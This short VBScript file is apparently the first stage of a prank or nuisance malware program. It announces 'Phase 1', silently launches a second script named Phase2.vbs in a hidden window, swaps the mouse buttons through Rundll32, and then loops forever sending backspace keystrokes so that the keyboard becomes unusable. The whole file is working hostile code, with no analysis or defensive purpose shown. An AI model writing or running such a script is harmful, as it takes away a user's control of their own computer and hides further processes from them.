Dim WshShell

MsgBox "Phase 1 starts now!"
MsgBox "Phase 1: No keyboard for you! & Reversed mouse!"

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "wscript.exe Phase2.vbs", 0, False
Set shell = CreateObject("WScript.Shell")
shell.Run "Rundll32 user32.dll,SwapMouseButton"
do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop